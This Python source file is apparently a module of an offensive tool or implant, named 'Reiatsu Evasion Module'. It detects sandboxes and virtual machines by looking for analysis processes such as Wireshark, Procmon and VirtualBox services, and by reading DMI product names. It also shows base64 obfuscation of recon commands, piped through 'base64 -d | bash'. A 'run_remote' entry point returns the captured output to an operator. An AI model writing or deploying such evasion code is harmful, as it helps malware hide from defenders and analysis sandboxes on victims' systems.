"""
Reiatsu Evasion Module - Sandbox detection and obfuscation techniques.
"""
import platform
import os
import base64
import io
import sys
import subprocess

class Evasion:
    """Defense Evasion: Sandbox detection and payload obfuscation."""
    
    @staticmethod
    def _detect_sandbox():
        """Detect sandbox and VM environments."""
        output = ""
        suspicious = False
        
        if platform.system() == 'Windows':
            procs = ['vboxservice.exe', 'vmtoolsd.exe', 'wireshark.exe', 'procmon.exe', 'procmon64.exe']
            try:
                tasks = subprocess.check_output('tasklist', universal_newlines=True, stderr=subprocess.DEVNULL).lower()
                for p in procs:
                    if p in tasks:
                        suspicious = True
                        output += f"[!] Potential sandbox: '{p}' detected.\n"
            except Exception:
                output += "[-] Could not execute 'tasklist'.\n"
        
        elif platform.system() == 'Linux':
            try:
                dmi_info = subprocess.check_output('cat /sys/class/dmi/id/product_name', shell=True, universal_newlines=True, stderr=subprocess.DEVNULL).lower()
                vm_indicators = ['virtual', 'vmware', 'qemu', 'oracle']
                if any(vm in dmi_info for vm in vm_indicators):
                    suspicious = True
                    output += f"[!] Potential VM: {dmi_info.strip()}\n"
            except Exception:
                output += "[-] Could not read DMI info.\n"
        
        if not suspicious:
            output += "[+] No sandbox/VM artifacts detected.\n"
        return output

    @staticmethod
    def run_remote(args):
        """Main entry point for the evasion module."""
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Running Evasion checks on {platform.system()}...")
            print("\n--- Sandbox/VM Detection ---")
            print(Evasion._detect_sandbox())
            
            print("\n--- Obfuscation Example ---")
            payload = "whoami /groups" if platform.system() == "Windows" else "id -a"
            encoded = base64.b64encode(payload.encode()).decode()
            print(f"Base64 encoding of '{payload}': {encoded}")
            print(f"Decode: echo '{encoded}' | base64 -d | bash")

        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()